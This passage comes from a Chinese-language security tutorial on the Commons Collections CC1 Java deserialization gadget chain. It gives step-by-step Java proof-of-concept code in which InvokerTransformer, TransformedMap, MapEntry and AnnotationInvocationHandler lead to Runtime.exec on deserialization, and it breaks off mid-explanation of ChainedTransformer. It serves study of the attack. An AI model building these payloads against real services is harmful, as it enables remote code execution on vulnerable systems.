Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p><p>简单来说，Common-Collections 这个项目开发出来是为了给 Java 标准的 <code>Collections API</code> 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。</p><ul><li><code>org.apache.commons.collections</code> – CommonsCollections自定义的一组公用的接口和工具类</li><li><code>org.apache.commons.collections.bag</code> – 实现Bag接口的一组类</li><li><code>org.apache.commons.collections.bidimap</code> – 实现BidiMap系列接口的一组类</li><li><code>org.apache.commons.collections.buffer</code> – 实现Buffer接口的一组类</li><li><code>org.apache.commons.collections.collection</code> –实现java.util.Collection接口的一组类</li><li><code>org.apache.commons.collections.comparators</code>– 实现java.util.Comparator接口的一组类</li><li><code>org.apache.commons.collections.functors</code> –Commons Collections自定义的一组功能类</li><li><code>org.apache.commons.collections.iterators</code> – 实现java.util.Iterator接口的一组类</li><li><code>org.apache.commons.collections.keyvalue</code> – 实现集合和键&#x2F;值映射相关的一组类</li><li><code>org.apache.commons.collections.list</code> – 实现java.util.List接口的一组类</li><li><code>org.apache.commons.collections.map</code> – 实现Map系列接口的一组类</li><li><code>org.apache.commons.collections.set</code> – 实现Set系列接口的一组类</li></ul><h2 id="3-1-Java反序列化利用链挖掘思路"><a href="#3-1-Java反序列化利用链挖掘思路" class="headerlink" title="3.1 Java反序列化利用链挖掘思路"></a>3.1 Java反序列化利用链挖掘思路</h2><p>根据之前的URLDNS链可以类似的总结出来反序列化攻击的利用链寻找思路是从后面往前面去找，先找到能够利用的危险函数再往前找利用的链路和类型，我们必须要有危险函数可以实现利用，然后再一步一步往前构造实现利用链；</p><p>重点应该在于<code>不同类的同名函数调用</code>，通过传入危险类的实例作为参数的某个类的实例调用该<code>同名函数</code>实现对<code>危险类该同名危险函数</code>的调用（总之，我们的目的就是调用危险类的的危险函数，但是我们无法直接调用，需要通过反序列化进行调用一些平常函数然后形成链调用危险类的危险函数）；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111441436.png" alt="img"></p><h2 id="3-2-InvokerTransformer实现命令执行"><a href="#3-2-InvokerTransformer实现命令执行" class="headerlink" title="3.2 InvokerTransformer实现命令执行"></a>3.2 InvokerTransformer实现命令执行</h2><p>为了能够实现漏洞利用，至少需要能够写文件或者能够命令执行，那么我们需要找到能够执行命令的地方。</p><p>在<code>commons-collections</code>中存在一个<code>InvokerTransformer</code>类中的<code>transform</code>方法能够通过反射调用<code>exec</code>实现命令执行；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111443671.png" alt="img"></p><p>其中的<code>input</code>作为形参传入，<code>iMethodName</code>、<code>iParamTypes</code>、<code>iArgs</code>三个变量均是类中属性，可以在实例化时对其进行初始化；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111443396.png" alt="img"></p><p>因此我们可以根据该实现调用<code>Runtime</code>类中的<code>exec</code>实现弹calc计算器；实践开始！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.InvokerTransfomerTransform2exec.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/25 13:53</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransfomerTransform2exec</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        invokerTransformer.transform(r);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在已经成功执行了危险函数了，那么后续的工作就是如何寻找利用链，怎么让某个类反序列化的时候根据利用链依次调用到<code>InvokerTransformer#transform()</code>函数；</p><p>总之，目前实现了第一步，找到一个类的方法执行了危险函数；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111441149.png" alt="img"></p><h2 id="3-3-TransformedMap调用transform函数"><a href="#3-3-TransformedMap调用transform函数" class="headerlink" title="3.3 TransformedMap调用transform函数"></a>3.3 TransformedMap调用transform函数</h2><p>通过idea自带的<code>查找用法</code>查找存在哪些函数调用了该同名函数<code>transform</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112253462.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111441962.png" alt="img"></p><p>可以看到总共有21个结果；如果结果数量较少或者没有，点击左边的设置，将作用域更改为<code>所有位置</code>即可；</p><p>对于这21个结果呢，其实还是有一部分能够继续构成链的，但是这一部分中，最后能够跟反序列化构成链的应该没几个；</p><p>那么这时候问题就来了</p><p>“那我们在实际情况中应该选哪个呢？”</p><p>“我也不知道！一个个找找看呗，能构成利用链的那个就是啦！人工深搜（dfs）一下”</p><p>在本次中应该选择的是在<code>TransformedMap</code>中的<code>checkSetValue()</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112314287.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111441677.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111441828.png" alt="img"></p><p>可以发现的是<code>valueTransformer</code>变量是作为类<code>TransformedMap</code>的属性，应该在其实例化时能够初始化；但是我们发现其构造函数是<code>protected</code>，无法调用其进行初始化；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112318868.png" alt="img"></p><p>但是，天无绝人之路！还有一个静态<code>decorate</code>函数能够为我们所用进行实例化；所以我们可以利用该函数其实例化一个指定属性的<code>TransformedMap</code>类的实例；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112318618.png" alt="img"></p><p>其实，细心的朋友可以发现咱们的<code>checkSetValue</code>函数也是<code>protected</code>的，我们不能够通过<code>TransformedMap</code>实例直接调用该函数，但是最后构造好的利用链的不同类均在内部包中，所以能够调用<code>checkSetValue</code>函数；</p><p>所以，我们目前先通过利用反射测试该方法是否能够成功弹出计算器；实践开始！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.TransformedMapCheckSetValue2transform.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/25 14:14</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMapCheckSetValue2transform</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br><br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Map</span>&gt; mapClass = transformedMap.getClass();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">checkSetValueMethod</span> <span class="hljs-operator">=</span> mapClass.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>, Object.class);<br>        checkSetValueMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        checkSetValueMethod.invoke(transformedMap, r);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111443513.png" alt="img"></p><h2 id="3-4-MapEntry调用checkSetValue函数"><a href="#3-4-MapEntry调用checkSetValue函数" class="headerlink" title="3.4 MapEntry调用checkSetValue函数"></a>3.4 MapEntry调用checkSetValue函数</h2><p>继续重复刚才查找用法的步骤，可以发现仅存在一个地方调用了同名函数</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408120010643.png" alt="img"><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111441497.png" alt="img"></p><p>来到调用函数的地方可以发现该类继承了MapEntry的装饰的抽象类；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408120012094.png" alt="img"></p><p>同样<code>TransformedMap</code>类也继承了Map输入检查的装饰类。</p><p>这里我们需要知道一个概念就是<code>**Map.Entry**</code><strong>就是在Map中的一个键值对（entry）</strong></p><p>到这里可能会有一点难理解，因为它们均继承了Map的装饰类，在CommonCollections中对Map接口进行了自己的实现，而MapEntry类的<code>setValue</code>方法即是继承<code>AbstractMapEntryDecorator</code> 对<code>Map.Entry</code>接口中<code>setValue</code>方法的实现；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408120022104.png" alt="img"></p><p>因此，我们在通过<code>decorate</code>函数实例化的<code>TransformedMap</code>实例是通过CommonCollection实现的Map，因此该TransformedMap的<code>Map.Entry</code>的调用的<code>setValue</code>方法是<code>MapEntry</code>中实现的方法；</p><p>由于<code>MapEntry</code>是继承于<code>Map.Entry</code>的，所以<code>setValue()</code>是通过<code>Map.Entry</code>进行调用的；</p><p>但是说了这么多，其实我们根本也不需要管那个<code>entry</code>，因为跟它没什么关系啊！因为是<code>parent</code>变量在调用<code>checkSetValue</code>函数呀，我们需要的是执行<code>checkSetValue</code>函数；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408120030805.png" alt="img"></p><p>通过跟踪<code>AbstractInputCheckedMapDecorator</code>类型可以发现，其最终是实现<code>Map</code>接口的，所以可以简单认为其是一个Map类型（不规范啊，别这么认为，方便理解就行）；根据查看构造函数<code>MapEntry</code>的用法，大概可以猜测到其应该是一个默认值，即<code>map</code>变量，用来判断每个键值对entry归属于哪个map变量的。（大致理解和猜测，底层代码太多太复杂，看不太懂）；</p><p>至此，可以得出的结论就是，通过entry调用<code>setValue</code>方法即可让map变量调用<code>checkSetValue</code>函数，这其实就已经达到我们的目的啦，因为我们要的就是让map变量调用<code>checkSetValue</code>函数；实践开始！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.MapEntry2checkSetValue.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/25 14:41</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapEntry2checkSetValue</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);    <span class="hljs-comment">// 键值是什么无所谓，主要是得有一对，这样才能取出键值对entry</span><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-keyword">for</span>(Map.Entry entry : transformedMap.entrySet()) &#123;<br>            entry.setValue(r);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111445647.png" alt="img"></p><h2 id="3-5-AnnotationInvocationHandler入口类readObject"><a href="#3-5-AnnotationInvocationHandler入口类readObject" class="headerlink" title="3.5 AnnotationInvocationHandler入口类readObject()"></a>3.5 AnnotationInvocationHandler入口类readObject()</h2><p>在完成前面这部分内容之后可能我们会产生一个疑问，就是“什么时候我们这个链才算是结束？”其实就是存在一个重写的<code>readObject()</code>中调用了相应的同名函数；这时候我们可以通过反序列化调用该函数实现链的利用；</p><p>在本次的CC1链中，继续查找<code>setValue</code>函数的用法查找，最后在<code>AnnotationInvocationHandler</code>类中重写<code>readObject</code>函数找到了对该函数的调用；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408122201506.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408122147809.png" alt="img"></p><p>可以看到<code>memberValue</code>变量的内容是跟<code>memberValues</code>变量有关的，也就是取出<code>memberValues</code>中的entry，这样只要我们将相应的map作为<code>memberValues</code>即可使其的entry调用<code>setValue</code>达到我们的目的；</p><p>来到该类的构造函数我们可以发现<code>memberValues</code>属性的值是可控的，我们在构造该类时即可设置相应的<code>memberValues</code>的值；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408122149815.png" alt="img"></p><p>我们首先尝试一下是否真的如我们所说的一样获得我们想要的属性值；由于<code>AnnotationInvocationHandler</code>类没有设置<code>public</code>属性，默认<code>default</code>，所以不能直接通过<code>new</code>进行实例化对象，因此需要通过反射进行实例化；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.AnnotationInvocationHandlerReadObject2setValue.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/25 14:51</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandlerReadObject2setValue</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        Class&lt;?&gt; annotationInvocationhandlerClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationhandlerconstructor = annotationInvocationhandlerClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationhandlerconstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">annotationInvocationHandler</span> <span class="hljs-operator">=</span> annotationInvocationhandlerconstructor.newInstance(Override.class, transformedMap);<br>        <span class="hljs-type">byte</span>[] ser = ser(annotationInvocationHandler);<br>        deser(ser);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();   <span class="hljs-comment">//定义字节数组输出流</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);  <span class="hljs-comment">//定义输出流</span><br>        oos.writeObject(o); <span class="hljs-comment">//序列化对象</span><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deser</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] ser)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser);  <span class="hljs-comment">//读取执行字节数组作为输入流</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);    <span class="hljs-comment">//将字节输入流作为输入流</span><br>        <span class="hljs-keyword">return</span> ois.readObject();    <span class="hljs-comment">//反序列化读取对象</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过下断点调试代码可以知道确实如我们所说，<code>memberValues</code>变量确实是我们所设置的参数；继续调试我们会发现我们无法进入<code>447行</code>的if结构中，尝试满足其判断；首先我们需要详细分析一下在<code>AnnotationInvocationHandler</code>类中重写的<code>readObject</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111443139.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<span class="hljs-comment">//获取我们传入类的</span><br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>其中<code>type</code>是我们自己传入的一个类，通过Chatgpt工具查询一下底层源码的功能我们可以知道<code>annotationType = AnnotationType.getInstance(type);</code>是为了获取type类中的<code>元数据</code>返回一个<code>AnnotationType</code>实例，对该实例在调用<code>memberTypes()</code>将<strong>属性名称</strong>和<strong>类型</strong>作为键值对构成<code>Map</code>；可以将<code>type</code>数据传入<code>Target.class</code>进行调试，得到以下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111441574.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111441822.png" alt="img"></p><p>所以当我们传入<code>Target.class</code>时，我们确保我们的map中存在一个键的值为<code>value</code>即可进入<code>447行</code>的if结构；顺势之下，我们也通过了下面的那个if结构，因为下面的if结构仅是判断我们取出的<code>值</code>是不是<code>memberType</code>类型的实例以及是不是<code>ExceptionProxy</code>类型的实例，均不是即可进入下面的if结构，因为我们的<code>值</code>是value，所以成功进入下面的if结构；</p><p>但是到这其实还不能够完成我们弹计算器的功能；因为在<code>AnnotationInvocationHandler</code>类中重写的<code>readObject</code>函数调用的<code>setValues</code>函数中传入的参数不可控，我们需要的应该是传入<code>Runtime</code>对象，然后去获取它的<code>exec</code>方法进行执行；</p><p>为了解决上述这个参数不可控的问题，我们需要介绍两个类，<code>ChainedTransformer</code>和<code>ConstantTransformer</code>来解决问题；</p><ul><li><code>ChainedTransformer</code>的作用和功能</li></ul><p><strong>链式执行</strong>: <code>ChainedTransformer</code> 接受一组 <code>Transformer</code> 对象，然后依次对输入数据应用这些转换<code>transform()</code>操作。每个 <code>Transformer</code> 的输出会作为下一个 <code>Transformer</code> 的参数输入。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111443572.png" alt="img"></p><ul><li><code>ConstantTransformer</code>的作用和功能</li></ul><p>主要作用是在转换<code>transform()</code>时返回一个预定义的常量值，无论输入是什么。也就是说，不管传递给 <code>ConstantTransformer</code> 